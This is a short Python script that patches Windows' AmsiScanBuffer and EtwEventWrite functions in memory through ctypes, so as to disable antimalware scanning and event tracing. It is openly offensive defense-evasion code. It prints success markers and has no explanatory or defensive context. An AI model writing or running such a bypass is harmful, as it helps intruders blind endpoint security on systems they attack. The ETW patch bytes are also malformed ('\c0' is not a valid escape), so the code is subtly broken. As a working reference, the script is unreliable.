import ctypes
import sys

def patch_amsi():
    try:
        amsi = ctypes.windll.amsi
        addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
        patch = b"\x31\xc0\xc3"  # xor eax, eax; ret
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
        print("[+] AMSI patched.")
    except Exception as e:
        print(f"[-] Failed AMSI patch: {e}")

def bypass_etw():
    try:
        ntdll = ctypes.windll.ntdll
        addr = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, b"EtwEventWrite")
        patch = b"\x48\x33\c0\xc3"  # xor rax, rax; ret
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
        print("[+] ETW bypassed.")
    except Exception as e:
        print(f"[-] Failed ETW bypass: {e}")
